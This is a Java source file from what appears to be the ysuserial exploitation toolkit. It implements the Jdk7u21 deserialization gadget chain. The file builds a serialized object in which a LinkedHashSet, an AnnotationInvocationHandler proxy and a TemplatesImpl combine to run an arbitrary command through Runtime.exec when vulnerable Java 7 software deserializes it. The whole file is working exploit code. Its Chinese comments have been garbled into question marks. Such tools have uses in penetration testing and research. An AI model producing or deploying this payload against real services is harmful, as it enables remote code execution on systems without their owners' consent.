package org.su18.ysuserial.payloads;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.LinkedHashSet;

import javax.xml.transform.Templates;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.JavaVersion;


/*

Gadget chain that works against JRE 1.7u21 and earlier. Payload generation has
the same JRE version requirements.

See: https://gist.github.com/frohoff/24af7913611f8406eaf3

Call tree:

LinkedHashSet.readObject()
  LinkedHashSet.add()
    ...
      TemplatesImpl.hashCode() (X)
  LinkedHashSet.add()
    ...
      Proxy(Templates).hashCode() (X)
        AnnotationInvocationHandler.invoke() (X)
          AnnotationInvocationHandler.hashCodeImpl() (X)
            String.hashCode() (0)
            AnnotationInvocationHandler.memberValueHashCode() (X)
              TemplatesImpl.hashCode() (X)
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
              ...
                TemplatesImpl.getOutputProperties()
                  TemplatesImpl.newTransformer()
                    TemplatesImpl.getTransletInstance()
                      TemplatesImpl.defineTransletClasses()
                        ClassLoader.defineClass()
                        Class.newInstance()
                          ...
                            MaliciousClass.<clinit>()
                              ...
                                Runtime.exec()
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies()
@Authors({Authors.FROHOFF})
public class Jdk7u21 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);

		// hashCode ??? 0 ????????????
		String zeroHashCodeStr = "f5a5a608";

		HashMap map = new HashMap();
		map.put(zeroHashCodeStr, "foo");

		// ?????? AnnotationInvocationHandler ??? HashMap ??????????????????
		Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor<?> constructor = c.getDeclaredConstructors()[0];
		constructor.setAccessible(true);
		InvocationHandler tempHandler = (InvocationHandler) constructor.newInstance(Override.class, map);

		// ???????????? AnnotationInvocationHandler ??? type
		Field field = c.getDeclaredField("type");
		field.setAccessible(true);
		field.set(tempHandler, Templates.class);

		// ??? Templates ??????????????????
		Templates proxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
				new Class[]{Templates.class}, tempHandler);

		// LinkedHashSet ????????? TemplatesImpl ?????????????????????
		LinkedHashSet set = new LinkedHashSet(); // maintain order
		set.add(templates);
		set.add(proxy);

		// ????????? _auxClasses ??? _class ????????? null
		Field field2 = TemplatesImpl.class.getDeclaredField("_auxClasses");
		field2.setAccessible(true);
		field2.set(templates, null);

		Field field3 = TemplatesImpl.class.getDeclaredField("_class");
		field3.setAccessible(true);
		field3.set(templates, null);

		// ??? map ????????? tmpl ??????
		map.put(zeroHashCodeStr, templates);

		return set;
	}

	public static boolean isApplicableJavaVersion() {
		JavaVersion v = JavaVersion.getLocalVersion();
		return v != null && (v.major < 7 || (v.major == 7 && v.update <= 21));
	}
}
